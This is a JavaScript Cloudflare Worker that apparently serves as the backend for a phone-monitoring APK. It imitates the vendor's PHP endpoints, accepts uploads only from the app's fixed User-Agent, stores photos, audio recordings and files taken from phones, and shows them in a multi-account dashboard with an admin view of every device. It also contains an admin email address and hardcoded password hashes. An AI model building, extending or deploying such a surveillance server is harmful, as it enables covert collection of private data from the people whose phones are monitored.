// Guardian Panel — Multi-ACCOUNT Worker (MODULE format — assets ke saath zaroori)
// ACCOUNT SYSTEM:
//   - /register page se account banao (email + password) -> KV mein save (persistent)
//   - APK setup mein WAHI email/password dalo -> us phone ka data usi account ke andar
//   - Panel login usi email se -> sirf usi account ka data dikhega
//   - ADMIN login: imranfarhat255@gmail.com + password (repo mein sirf hash)
//   - Backup admin: email khali + master password (repo mein sirf hash)
// OTP: email-service API key (jaise Resend) dene ke baad add hoga.
//
// APK responses (zaroori):
//   data uploads              -> EXACT text "ok"
//   user/loginUser.php        -> {"status":"ok","idClient":N} | {"status":"no"} (galat pw) | {"status":"no3"} (email registered nahi)
//   user/verifPhone.php       -> {"status":"ok","nbPhone":0|1}
//   user/savePhone.php        -> {"status":"ok","idPhone":unique}
//   user/getLastVersionApp.php-> {"forceUpdateApp":"false"}
//
// Bindings: env.KV_DATA (KV namespace), env.ASSETS (static files)
// KV keys: acct:data, acct:seq, dev:names, dev:client, f:<id>, m:<id>

var captures = [];
var MAX_CAPTURES = 5000;
var ADMIN_EMAIL = "imranfarhat255@gmail.com"; // 👑 admin login (email + password)
var ADMIN_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9"; // admin password ka SHA-256 (plain text repo mein NAHI)
var PASS_HASH = "86f1672bb6586732adac9bc70e357457bfe50c1dd20cdcbcf82476f6a0d0a3d5"; // backup master (email khali)
var SESSION_DAYS = 30;
var APK_UA = "ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019";

var ENV = null; // env bindings (KV_DATA, ASSETS) — fetch pe set hota hai

/* ---------- in-memory state (KV se load hote hain) ---------- */
var accounts = {}; // email -> {p: hash, c: idClient}
var acctSeq = 0;
var deviceSeq = 0;
var deviceNames = {}; // idPhone -> naam
var devClient = {}; // idPhone -> idClient

var accountsLoaded = false;
var namesLoaded = false;
var devClientLoaded = false;

/* ---------- captures KV persistence (restart-proof) ---------- */
var capLoaded = false;
var capDirty = false;
var capLastSave = 0;
var CAP_KV_MAX = 3000;

async function loadCaptures() {
  if (capLoaded || !hasKV()) return;
  capLoaded = true;
  try {
    var raw = await ENV.KV_DATA.get("cap:data");
    if (raw) {
      var arr = JSON.parse(raw);
      if (Array.isArray(arr)) captures = arr;
    }
  } catch (e) {}
}

async function saveCaptures(force) {
  if (!hasKV()) return;
  var now = Date.now();
  if (!force && now - capLastSave < 5000) {
    capDirty = true;
    return;
  }
  capLastSave = now;
  capDirty = false;
  try {
    var snap = captures.length > CAP_KV_MAX ? captures.slice(0, CAP_KV_MAX) : captures;
    await ENV.KV_DATA.put("cap:data", JSON.stringify(snap));
  } catch (e) {}
}

function hasKV() {
  return !!(ENV && ENV.KV_DATA);
}

async function loadAccounts() {
  if (accountsLoaded) return;
  accountsLoaded = true;
  if (!hasKV()) return;
  try {
    var raw = await ENV.KV_DATA.get("acct:data");
    if (raw) accounts = JSON.parse(raw) || {};
    var sq = await ENV.KV_DATA.get("acct:seq");
    acctSeq = sq ? parseInt(sq, 10) || 0 : 0;
  } catch (e) {}
}

async function saveAccounts() {
  if (!hasKV()) return;
  try {
    await ENV.KV_DATA.put("acct:data", JSON.stringify(accounts));
    await ENV.KV_DATA.put("acct:seq", String(acctSeq));
  } catch (e) {}
}

async function loadNames() {
  if (namesLoaded) return;
  namesLoaded = true;
  if (!hasKV()) return;
  try {
    var raw = await ENV.KV_DATA.get("dev:names");
    if (raw) {
      deviceNames = JSON.parse(raw) || {};
      var mx = 0;
      for (var id in deviceNames) {
        var n = parseInt(id, 10);
        if (n > mx) mx = n;
      }
      deviceSeq = mx;
    }
  } catch (e) {}
}

async function saveNames() {
  if (!hasKV()) return;
  try {
    await ENV.KV_DATA.put("dev:names", JSON.stringify(deviceNames));
  } catch (e) {}
}

async function loadDevClient() {
  if (devClientLoaded) return;
  devClientLoaded = true;
  if (!hasKV()) return;
  try {
    var raw = await ENV.KV_DATA.get("dev:client");
    if (raw) devClient = JSON.parse(raw) || {};
  } catch (e) {}
}

async function saveDevClient() {
  if (!hasKV()) return;
  try {
    await ENV.KV_DATA.put("dev:client", JSON.stringify(devClient));
  } catch (e) {}
}

/* ---------- crypto helpers ---------- */
function b64url(u8) {
  var s = "";
  for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function b64urlDecode(str) {
  var s = str.replace(/-/g, "+").replace(/_/g, "/");
  while (s.length % 4) s += "=";
  var raw = atob(s);
  var u8 = new Uint8Array(raw.length);
  for (var i = 0; i < raw.length; i++) u8[i] = raw.charCodeAt(i);
  return u8;
}

async function sha256Hex(text) {
  var buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  var u8 = new Uint8Array(buf);
  var out = "";
  for (var i = 0; i < u8.length; i++) out += (u8[i] < 16 ? "0" : "") + u8[i].toString(16);
  return out;
}

async function signPayload(payloadStr) {
  var key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(PASS_HASH),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  var sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(payloadStr));
  return b64url(new Uint8Array(sig));
}

async function makeSessionToken(email, clientId) {
  var exp = Date.now() + SESSION_DAYS * 24 * 3600 * 1000;
  var payload = b64url(new TextEncoder().encode(JSON.stringify({ e: email, c: clientId, x: exp })));
  var sig = await signPayload(payload);
  return payload + "." + sig;
}

async function readSession(request) {
  try {
    var ck = request.headers.get("Cookie") || "";
    var m = ck.match(/(?:^|;\s*)gp_session=([^;]+)/);
    if (!m) return null;
    var parts = m[1].split(".");
    if (parts.length !== 2) return null;
    var sig = await signPayload(parts[0]);
    if (sig !== parts[1]) return null;
    var obj = JSON.parse(new TextDecoder().decode(b64urlDecode(parts[0])));
    if (!obj || !obj.x || obj.x < Date.now()) return null;
    return { email: String(obj.e || ""), clientId: String(obj.c || "all") };
  } catch (e) {
    return null;
  }
}

/* ---------- assets ---------- */
async function serveAsset(origin, targetPath) {
  if (!ENV || !ENV.ASSETS) {
    return new Response("Dashboard files not configured (ASSETS binding missing)", { status: 500 });
  }
  try {
    return await ENV.ASSETS.fetch(new Request(origin + targetPath));
  } catch (e) {
    return new Response("Asset error: " + String(e), { status: 500 });
  }
}

/* ---------- KV file serving ---------- */
function guessMime(name) {
  var n = String(name || "").toLowerCase();
  var ext = n.indexOf(".") >= 0 ? n.slice(n.lastIndexOf(".") + 1) : "";
  var m = {
    jpg: "image/jpeg", jpeg: "image/jpeg", png: "image/png", gif: "image/gif", webp: "image/webp", bmp: "image/bmp",
    mp4: "video/mp4", "3gp": "video/3gpp", avi: "video/x-msvideo", mov: "video/quicktime", mkv: "video/x-matroska", webm: "video/webm",
    amr: "audio/amr", m4a: "audio/mp4", mp3: "audio/mpeg", ogg: "audio/ogg", wav: "audio/wav", aac: "audio/aac", opus: "audio/ogg",
    pdf: "application/pdf", txt: "text/plain", html: "text/html", json: "application/json", zip: "application/zip",
    apk: "application/vnd.android.package-archive"
  };
  return m[ext] || null;
}

async function serveFile(key) {
  if (!hasKV()) return jsonResp({ error: "KV_DATA not connected" }, 404);
  if (!key || key.indexOf(":") >= 0) return jsonResp({ error: "bad key" }, 400);
  try {
    var metaRaw = await ENV.KV_DATA.get("m:" + key);
    var data = await ENV.KV_DATA.get("f:" + key, "arrayBuffer");
    if (!data) return jsonResp({ error: "not found" }, 404);
    var meta = { type: "application/octet-stream", name: key };
    if (metaRaw) {
      try { meta = JSON.parse(metaRaw); } catch (e) {}
    }
    var ctype = meta.type || "application/octet-stream";
    if (ctype === "multipart/form-data" || ctype === "application/octet-stream") {
      var g = guessMime(meta.name || key);
      if (g) ctype = g;
    }
    return new Response(data, {
      status: 200,
      headers: Object.assign(
        {
          "content-type": ctype,
          "content-disposition": 'inline; filename="' + String(meta.name || key) + '"',
          "cache-control": "public, max-age=86400",
        },
        corsHeaders()
      ),
    });
  } catch (e2) {
    return jsonResp({ error: String(e2) }, 500);
  }
}

/* ---------- response helpers (ye missing the — crash ka reason) ---------- */
function corsHeaders() {
  return {
    "access-control-allow-origin": "*",
    "access-control-allow-methods": "GET, POST, OPTIONS",
    "access-control-allow-headers": "content-type",
  };
}

function jsonResp(obj, status) {
  return new Response(JSON.stringify(obj), {
    status: status || 200,
    headers: Object.assign({ "content-type": "application/json; charset=utf-8" }, corsHeaders()),
  });
}

/* ---------- main router ---------- */
async function handle(request) {
  var url = new URL(request.url);
  var method = request.method;
  var path = url.pathname;

  if (method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders() });
  }

  // ---------- LOGIN (public) ----------
  if (path === "/api/login" && method === "POST") {
    try {
      var loginBody = await request.json();
      var inEmail = String(loginBody.email || "").trim().toLowerCase();
      var inPw = String(loginBody.password || "").trim();

      if (inEmail === ADMIN_EMAIL) {
        var adminHash = await sha256Hex(inPw);
        if (adminHash === ADMIN_HASH) {
          var tokA = await makeSessionToken("admin", "all");
          return sessionResp(tokA);
        }
        return jsonResp({ ok: false, error: "wrong password" }, 401);
      }

      if (inEmail === "") {
        // Backup master login: email khali + master password
        var masterHash = await sha256Hex(inPw);
        if (masterHash === PASS_HASH) {
          var tok = await makeSessionToken("admin", "all");
          return sessionResp(tok);
        }
        return jsonResp({ ok: false, error: "wrong password" }, 401);
      }

      await loadAccounts();
      var acct = accounts[inEmail];
      if (acct) {
        var acctHash = await sha256Hex(inEmail + ":" + inPw);
        if (acctHash === acct.p) {
          var tok2 = await makeSessionToken(inEmail, String(acct.c));
          return sessionResp(tok2);
        }
      }
      return jsonResp({ ok: false, error: "galat email ya password" }, 401);
    } catch (e) {
      return jsonResp({ ok: false, error: "bad request" }, 400);
    }
  }

  // ---------- REGISTER (public) ----------
  if (path === "/api/register" && method === "POST") {
    try {
      var regBody = await request.json();
      var rEmail = String(regBody.email || "").trim().toLowerCase();
      var rPw = String(regBody.password || "").trim();
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(rEmail)) {
        return jsonResp({ ok: false, error: "email sahi nahi hai" }, 400);
      }
      if (rPw.length < 4) {
        return jsonResp({ ok: false, error: "password kam se kam 4 character" }, 400);
      }
      if (rEmail === ADMIN_EMAIL) {
        return jsonResp({ ok: false, error: "ye email admin ke liye reserved hai" }, 409);
      }
      await loadAccounts();
      if (accounts[rEmail]) {
        return jsonResp({ ok: false, error: "ye email already registered hai" }, 409);
      }
      acctSeq = acctSeq + 1;
      accounts[rEmail] = { p: await sha256Hex(rEmail + ":" + rPw), c: acctSeq };
      await saveAccounts();
      return jsonResp({ ok: true, idClient: acctSeq });
    } catch (e2) {
      return jsonResp({ ok: false, error: "bad request" }, 400);
    }
  }

  // ---------- LOGOUT ----------
  if (path === "/api/logout" && method === "POST") {
    return new Response(JSON.stringify({ ok: true }), {
      status: 200,
      headers: Object.assign(
        {
          "content-type": "application/json; charset=utf-8",
          "Set-Cookie": "gp_session=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0",
        },
        corsHeaders()
      ),
    });
  }

  // ---------- Dashboard API (auth required) ----------
  if (path.indexOf("/api/") === 0) {
    var sess = await readSession(request);
    if (!sess) return jsonResp({ error: "unauthorized" }, 401);

    if (path === "/api/me" && method === "GET") {
      return jsonResp({ email: sess.email, admin: sess.clientId === "all", clientId: sess.clientId });
    }
    if (path === "/api/rename" && method === "POST") {
      try {
        var renBody = await request.json();
        var renFrom = String(renBody.from || "").trim();
        var renTo = String(renBody.to || "").trim();
        if (!renFrom || !renTo) return jsonResp({ ok: false, error: "from aur to dono chahiye" }, 400);
        if (sess.clientId !== "all") return jsonResp({ ok: false, error: "sirf admin rename kar sakta hai" }, 403);
        await loadNames();
        var renamed = [];
        for (var dnId in deviceNames) {
          if (String(deviceNames[dnId]) === renFrom) {
            deviceNames[dnId] = renTo;
            renamed.push(dnId);
          }
        }
        if (renamed.length) await saveNames();
        return jsonResp({ ok: true, renamed: renamed });
      } catch (eR) {
        return jsonResp({ ok: false, error: "bad request" }, 400);
      }
    }
    if (path === "/api/captures" && method === "GET") {
      await loadCaptures();
      if (capDirty) await saveCaptures(true);
      var mine = sess.clientId === "all"
        ? captures
        : captures.filter(function (c) { return c.clientId === sess.clientId; });
      return jsonResp(mine);
    }
    if (path === "/api/clear" && method === "POST") {
      await loadCaptures();
      if (sess.clientId === "all") {
        captures = [];
      } else {
        captures = captures.filter(function (c) { return c.clientId !== sess.clientId; });
      }
      await saveCaptures(true);
      return jsonResp({ ok: true, message: "cleared" });
    }
    if (path === "/api/health" && method === "GET") {
      await loadCaptures();
      if (capDirty) await saveCaptures(true);
      return jsonResp({ ok: true, captures: captures.length, kv: hasKV(), time: new Date().toISOString() });
    }
    if (path.indexOf("/api/file/") === 0 && method === "GET") {
      return serveFile(path.slice("/api/file/".length));
    }
    return jsonResp({ error: "not found" }, 404);
  }

  // ---------- APK capture (POST, sirf asli APK User-Agent) ----------
  if (method === "POST") {
    var ua = request.headers.get("user-agent") || "";
    if (ua.indexOf(APK_UA) < 0) {
      return jsonResp({ error: "forbidden" }, 403);
    }

    var p = url.pathname;
    var capPromise = capturePost(request, url);

    return capPromise.then(async function (cap) {
      var f = (cap && cap.fields) || {};

      if (p === "/user/loginUser.php") {
        await loadAccounts();
        var aEmail = String(f.email || "").trim().toLowerCase();
        var aPw = String(f.mdp || "").trim();
        var a = accounts[aEmail];
        if (a) {
          var aHash = await sha256Hex(aEmail + ":" + aPw);
          if (aHash === a.p) {
            return jsonResp({ status: "ok", idClient: a.c });
          }
          // password galat -> APK dikhayega: "Email and/or password incorrect"
          return jsonResp({ status: "no" });
        }
        // email registered nahi -> APK dikhayega: "An error occurred during registration"
        // (no2 = "suspended" vendor message — ise kabhi mat bhejo)
        return jsonResp({ status: "no3" });
      }
      if (p === "/user/verifPhone.php") {
        await loadNames();
        var wantName = String(f.namePhone || "");
        var exists = 0;
        if (wantName !== "") {
          for (var id in deviceNames) {
            if (String(deviceNames[id]) === wantName) {
              exists = 1;
              break;
            }
          }
        }
        return jsonResp({ status: "ok", nbPhone: exists });
      }
      if (p === "/user/savePhone.php") {
        await loadNames();
        await loadDevClient();
        deviceSeq = deviceSeq + 1;
        var newId = deviceSeq;
        deviceNames[String(newId)] = String(f.namePhone || "") || "Device-" + newId;
        var cl = String(f.idClient || "");
        if (cl !== "") devClient[String(newId)] = cl;
        await saveNames();
        await saveDevClient();
        return jsonResp({ status: "ok", idPhone: newId });
      }
      if (p === "/user/getLastVersionApp.php") {
        return jsonResp({ forceUpdateApp: "false", lastVersion: "525" });
      }
      return new Response("ok", {
        status: 200,
        headers: Object.assign({ "content-type": "text/plain; charset=utf-8" }, corsHeaders()),
      });
    });
  }

  // ---------- GET routing ----------
  if (method === "GET") {
    var sessGet = await readSession(request);

    if (sessGet) {
      if (path === "/" || path === "/index.html") return serveAsset(url.origin, "/index.html");
      return Response.redirect(url.origin + "/", 302);
    }

    if (path === "/login" || path === "/login.html") return serveAsset(url.origin, "/login.html");
    if (path === "/register" || path === "/register.html") return serveAsset(url.origin, "/register.html");
    return Response.redirect(url.origin + "/login", 302);
  }

  return new Response("Not found", { status: 404, headers: corsHeaders() });
}

function sessionResp(tok) {
  return new Response(JSON.stringify({ ok: true }), {
    status: 200,
    headers: Object.assign(
      {
        "content-type": "application/json; charset=utf-8",
        "Set-Cookie":
          "gp_session=" + tok + "; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=" + (SESSION_DAYS * 24 * 3600),
      },
      corsHeaders()
    ),
  });
}

/* ---------- capture ---------- */
async function capturePost(request, url) {
  await loadCaptures();
  await loadNames();
  await loadDevClient();
  var fields = {};
  var files = [];
  var bodyPreview = "";

  try {
    var ct = request.headers.get("content-type") || "";

    if (ct.indexOf("multipart/form-data") === 0) {
      var form = await request.formData();
      var entries = [];
      form.forEach(function (value, key) {
        entries.push([key, value]);
      });
      for (var i = 0; i < entries.length; i++) {
        var key = entries[i][0];
        var value = entries[i][1];
        var isFile = value && typeof value === "object" && typeof value.arrayBuffer === "function";
        if (isFile) {
          var isDup = false;
          if (url.pathname.indexOf("/pictures/") === 0) {
            var dName = String(fields.name || ""), dSize = String(fields.size || ""), dPhone = String(fields.idPhone || "");
            for (var ci = 0; ci < captures.length; ci++) {
              var cc = captures[ci];
              if (cc && cc.path && String(cc.path).indexOf("/pictures/") === 0) {
                var cf = cc.fields || {};
                if (String(cf.name || "") === dName && String(cf.size || "") === dSize && String(cf.idPhone || "") === dPhone) {
                  isDup = true;
                  break;
                }
              }
            }
          }
          var meta = {
            name: value.name,
            type: (function () {
              var t = value.type || "";
              if (t === "multipart/form-data" || t === "application/octet-stream" || t === "") {
                var g = guessMime(value.name);
                if (g) return g;
              }
              return t || "application/octet-stream";
            })(),
            size: value.size,
            fileKey: null,
          };
          if (isDup) {
            files.push({ name: value.name, size: value.size, duplicate: true });
            fields[key] = "[dup] " + value.name;
          } else if (hasKV() && value.size <= 20971520) {
            try {
              var fkey = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
              await ENV.KV_DATA.put("f:" + fkey, await value.arrayBuffer());
              await ENV.KV_DATA.put("m:" + fkey, JSON.stringify(meta));
              meta.fileKey = fkey;
            } catch (e2) {
              // KV fail -> metadata only
            }
            files.push(meta);
            fields[key] = "[file] " + value.name;
          } else {
            files.push(meta);
            fields[key] = "[file] " + value.name;
          }
        } else {
          fields[key] = String(value);
        }
      }
    } else {
      var text = await request.text();
      bodyPreview = String(text).slice(0, 4000);
      try {
        var params = new URLSearchParams(text);
        params.forEach(function (v, k) {
          fields[k] = v;
        });
      } catch (e3) {
        // not form-urlencoded -> keep raw body only
      }
    }
  } catch (e) {
    bodyPreview = "[parse error] " + String(e);
  }

  var deviceId = null;
  var deviceName = null;
  var fid = fields.idPhone;
  if (fid !== undefined && fid !== null && fid !== "") {
    deviceId = String(fid);
    deviceName = deviceNames[deviceId] || null;
  }

  var clientId = String(fields.idClient || "");
  if (clientId === "" && deviceId) {
    clientId = devClient[deviceId] || "";
  }

  var cap = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
    time: new Date().toISOString(),
    path: url.pathname,
    query: Object.fromEntries(url.searchParams),
    fields: fields,
    files: files,
    body: bodyPreview,
    ip: request.headers.get("cf-connecting-ip") || "",
    ua: request.headers.get("user-agent") || "",
    deviceId: deviceId,
    deviceName: deviceName,
    clientId: clientId || null,
  };

  var dupOnly = url.pathname.indexOf("/pictures/") === 0 && files.length > 0 && files.every(function (x) { return x && x.duplicate; });
  if (dupOnly) {
    return cap;
  }

  captures.unshift(cap);
  if (captures.length > MAX_CAPTURES) {
    captures.pop();
  }
  await saveCaptures(false);
  return cap;
}

export default {
  async fetch(request, env, ctx) {
    ENV = env;
    return handle(request);
  },
};
